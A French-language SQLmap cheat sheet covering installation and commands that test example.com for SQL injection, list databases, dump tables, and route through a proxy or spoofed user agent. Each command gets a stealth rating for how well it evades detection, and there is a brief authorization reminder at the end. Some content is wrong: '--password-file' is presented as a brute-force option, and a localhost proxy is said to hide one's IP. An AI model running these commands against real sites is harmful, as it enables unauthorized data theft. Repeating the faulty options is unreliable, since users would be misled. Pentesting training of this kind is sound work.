# 😁 SQLmap

#### Introduction

SQLmap est un outil open-source pour l'exploration et l'exploitation des vulnérabilités d'injection SQL. Il peut automatiser le processus d'injection SQL, ce qui en fait un outil précieux pour les pentesters et les chercheurs en sécurité.

#### Installation de SQLmap

SQLmap est généralement disponible via les dépôts de nombreuses distributions Linux ou peut être installé directement depuis le dépôt officiel.

**Installation sur Debian/Ubuntu**

1.  **Installer via `apt`** (version souvent non à jour) :

    ```bash
    sudo apt update
    sudo apt install sqlmap
    ```
2.  **Installer la dernière version depuis GitHub** :

    ```bash
    sudo apt update
    sudo apt install git
    git clone https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
    ```

    Ensuite, vous pouvez exécuter SQLmap directement à partir du répertoire `sqlmap-dev` :

    ```bash
    cd sqlmap-dev
    python sqlmap.py
    ```

**Installation sur Windows**

1. **Télécharger SQLmap** depuis le [dépôt GitHub](https://github.com/sqlmapproject/sqlmap).
2. **Décompresser l'archive**.
3.  **Exécuter SQLmap** via le terminal ou l'invite de commandes :

    ```cmd
    python sqlmap.py
    ```

#### Commandes et Options de Base

**Commande de Base pour Détecter les Vulnérabilités**

1.  **Tester une URL pour les injections SQL**

    ```bash
    sqlmap -u "http://example.com/page.php?id=1"
    ```

    * **Explication** : `-u` spécifie l'URL de la page contenant le paramètre à tester pour les injections SQL.
    * **Discrétion** : Moyenne. Ce test peut générer du trafic réseau visible et déclencher des alertes sur les systèmes de détection d'intrusion (IDS).

**Commandes Avancées**

1.  **Spécifier un Paramètre de Cookie**

    ```bash
    sqlmap -u "http://example.com/page.php?id=1" --cookie="SESSIONID=abcd1234"
    ```

    * **Explication** : `--cookie` permet de spécifier les cookies pour les sessions authentifiées ou pour tester les vulnérabilités dans un contexte de session.
    * **Discrétion** : Moyenne à élevée. Les cookies peuvent contenir des informations sensibles.
2.  **Utiliser des Données POST pour Tester les Injections**

    ```bash
    sqlmap -u "http://example.com/page.php" --data="username=admin&password=1234"
    ```

    * **Explication** : `--data` spécifie les données POST à envoyer pour tester les vulnérabilités dans les formulaires soumis.
    * **Discrétion** : Moyenne. Le test de formulaires POST peut révéler des failles dans les processus d'authentification.
3.  **Détecter et Exploiter une Vulnérabilité**

    ```bash
    sqlmap -u "http://example.com/page.php?id=1" --dbs
    ```

    * **Explication** : `--dbs` demande à SQLmap de lister les bases de données disponibles une fois qu'une vulnérabilité est détectée.
    * **Discrétion** : Faible à moyenne. L'extraction de la liste des bases de données peut attirer l'attention.
4.  **Extraire des Tables et des Données**

    ```bash
    sqlmap -u "http://example.com/page.php?id=1" --dbs --tables -D <database_name> -T <table_name> --dump
    ```

    * **Explication** : `--tables` liste les tables dans la base de données spécifiée, et `--dump` extrait les données de la table spécifiée.
    * **Discrétion** : Faible à élevée. L'extraction des données peut être détectée par des systèmes de journalisation et de détection.
5.  **Utiliser une Liste de Proxy**

    ```bash
    sqlmap -u "http://example.com/page.php?id=1" --proxy="http://127.0.0.1:8080"
    ```

    * **Explication** : `--proxy` permet d'utiliser un proxy pour masquer l'origine des requêtes.
    * **Discrétion** : Haute. L'utilisation d'un proxy aide à masquer l'origine des tests.
6.  **Définir une Utilisation d'Agents Utilisateurs**

    ```bash
    sqlmap -u "http://example.com/page.php?id=1" --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
    ```

    * **Explication** : `--user-agent` permet de spécifier un agent utilisateur pour tromper les mécanismes de filtrage basés sur l'agent utilisateur.
    * **Discrétion** : Haute. L'utilisation d'un agent utilisateur personnalisé peut contourner certaines protections.
7.  **Sauvegarder les Résultats dans un Fichier**

    ```bash
    sqlmap -u "http://example.com/page.php?id=1" --output-dir="/path/to/results"
    ```

    * **Explication** : `--output-dir` spécifie le répertoire où enregistrer les résultats de l'analyse.
    * **Discrétion** : Haute. Sauvegarder les résultats permet une analyse plus approfondie hors ligne.

#### Options de Sécurité Avancées

1.  **Spécifier des Filtres pour les Requêtes**

    ```bash
    sqlmap -u "http://example.com/page.php?id=1" --data="username=admin&password=1234" --exclude-sysdbs --technique=BEUSTQ
    ```

    * **Explication** : `--exclude-sysdbs` exclut les bases de données système des résultats, et `--technique` spécifie les techniques d'injection à tester.
    * **Discrétion** : Haute. Ajuster les techniques et les filtres permet de se concentrer sur des tests spécifiques.
2.  **Utiliser une Liste de Mots de Passe pour les Attaques de Brute Force**

    ```bash
    sqlmap -u "http://example.com/page.php?id=1" --passwords --password-file="/path/to/passwords.txt"
    ```

    * **Explication** : `--password-file` permet d'utiliser une liste de mots de passe pour les tentatives de connexion par brute force.
    * **Discrétion** : Faible à moyenne. Les attaques par brute force peuvent générer un grand nombre de tentatives de connexion.

#### Exemples de Scénarios

1.  **Détection Simple d’Injection SQL**

    ```bash
    sqlmap -u "http://example.com/page.php?id=1"
    ```

    * **Explication** : Teste la vulnérabilité d'injection SQL pour le paramètre `id` dans l'URL.
    * **Discrétion** : Moyenne. Ce test est généralement discret, mais peut être détecté par des IDS si les requêtes sont trop fréquentes.
2.  **Exploitation Avancée avec Extraction de Données**

    ```bash
    sqlmap -u "http://example.com/page.php?id=1" --dbs --tables -D <database_name> -T <table_name> --dump
    ```

    * **Explication** : Liste les bases de données, les tables et extrait les données de la table spécifiée après avoir détecté une vulnérabilité.
    * **Discrétion** : Faible à élevée. L'extraction de données est plus intrusive et peut attirer l'attention.
3.  **Utilisation de Proxy pour Masquer l’Origine**

    ```bash
    sqlmap -u "http://example.com/page.php?id=1" --proxy="http://127.0.0.1:8080"
    ```

    * **Explication** : Utilise un proxy pour acheminer les requêtes et masquer l'adresse IP d'origine.
    * **Discrétion** : Haute. Le proxy aide à cacher l'origine des tests et minimise le risque d'être détecté.
4.  **Test de Vulnérabilités avec Authentification**

    ```bash
    sqlmap -u "http://example.com/page.php?id=1" --cookie="SESSIONID=abcd1234"
    ```

    * **Explication** : Inclut des cookies pour tester les vulnérabilités dans un contexte de session authentifiée.
    * **Discrétion** : Moyenne à élevée. Les tests authentifiés peuvent être plus ciblés mais nécessitent des données de session valides.

#### Discrétion et Bonnes Pratiques

1. **Obtenir des Autorisations**
   * **Assurez-vous toujours** d'avoir l'autorisation explicite pour tester les applications web.
   * **Évitez les tests non autorisés** pour éviter des implications légales et éthiques.
2. **Utiliser les Fonctionnalités de Limitation**
   * **Configurer des délais** entre les requêtes pour éviter de surcharger les serveurs et attirer l'attention.
   * **Limiter les tests** en termes de portée et de profondeur pour minimiser les impacts sur les systèmes cibles.
3. **Analyser les Réactions du Serveur**
   * **Observer les réponses des serveurs** pour ajuster les tests et éviter les dénis de service ou les perturbations.
